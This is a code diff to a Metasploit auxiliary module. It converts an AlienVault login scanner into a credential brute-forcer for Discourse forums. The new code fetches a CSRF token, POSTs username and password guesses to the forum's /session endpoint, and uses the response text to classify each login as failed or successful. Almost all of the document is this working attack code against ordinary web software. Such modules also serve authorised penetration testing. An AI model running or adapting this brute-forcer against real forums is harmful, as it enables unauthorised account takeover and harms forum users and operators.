@@ -10,7 +10,7 @@ require 'metasploit/framework/login_scanner/http'
 module Metasploit
   module Framework
     module LoginScanner
-      class AlienVault < ::Metasploit::Framework::LoginScanner::HTTP
+      class Discourse < ::Metasploit::Framework::LoginScanner::HTTP
         def attempt_login(credential)
           result_opts = {
             credential: credential,
@@ -26,23 +26,40 @@ module Metasploit
             cli.connect
 
             req = cli.request_cgi({
-              'method' => 'POST',
-              'uri' => normalize_uri(target_uri.path, 'ossim', 'session', 'login.php'),
-              'vars_post' => {
-                'embed' => '',
-                'bookmark_string' => '',
-                'user' => credential.public,
-                'passu' => credential.private,
-                'pass' => Rex::Text.encode_base64(credential.private)
+              'uri' => uri + '/session/csrf',
+              'headers' => {
+                'X-Requested-With' => 'XMLHttpRequest'
               }
             })
 
             res = cli.send_recv(req)
 
-            if res && res.code == 302
-              result_opts.merge!(status: ::Metasploit::Model::Login::Status::SUCCESSFUL, proof: res)
-            else
-              result_opts.merge!(status: ::Metasploit::Model::Login::Status::INCORRECT, proof: res)
+            if res && res.code == 200
+              cookie = res.get_cookies
+
+              csrf = JSON.parse(res.body)["csrf"]
+
+              req = cli.request_cgi({
+                'uri' => uri + '/session',
+                'method' => 'POST',
+                'headers' => {
+                  'X-CSRF-TOKEN' => csrf,
+                  'X-Requested-With' => 'XMLHttpRequest'
+                },
+                'vars_post' => {
+                  'login' => credential.public,
+                  'password' => credential.private
+                },
+                'cookie' => cookie
+              })
+
+              res = cli.send_recv(req)
+
+              if res && res.body =~ /"error":/
+                result_opts.merge!(status: ::Metasploit::Model::Login::Status::INCORRECT, proof: res)
+              elsif res && res.body =~ /user_badges/
+                result_opts.merge!(status: ::Metasploit::Model::Login::Status::SUCCESSFUL, proof: res.body)
+              end
             end
           rescue Exception => e
             result_opts.merge!(status: ::Metasploit::Model::Login::Status::UNABLE_TO_CONNECT, proof:e)
@@ -65,23 +82,20 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-        'Name'           => 'AlienVault Login Scanner',
+        'Name'           => 'Discourse Forums Login Scanner',
         'Description'    => %q(
-        This modules attempts to bruteforce credentials on an
-        AlienVault instance.
+        This module bruteforces Discourse Forums credentials
       ),
         'Author'         =>
           [
-            'ExploitHub'
           ],
         'License'        => 'ExploitHub',
         'References'     =>
           [
           ],
         'DefaultOptions' => {
-            'RPORT'           => 443,
-            'STOP_ON_SUCCESS' => true,
-            'SSL' => true
+            'RPORT'           => 80,
+            'STOP_ON_SUCCESS' => true
         }
     )
   end
@@ -97,7 +111,7 @@ class MetasploitModule < Msf::Auxiliary
       user_as_pass: datastore['USER_AS_PASS']
     )
 
-    scanner = Metasploit::Framework::LoginScanner::AlienVault.new(
+    scanner = Metasploit::Framework::LoginScanner::Discourse.new(
       configure_http_login_scanner(
         host: ip,
         port: datastore['RPORT'],
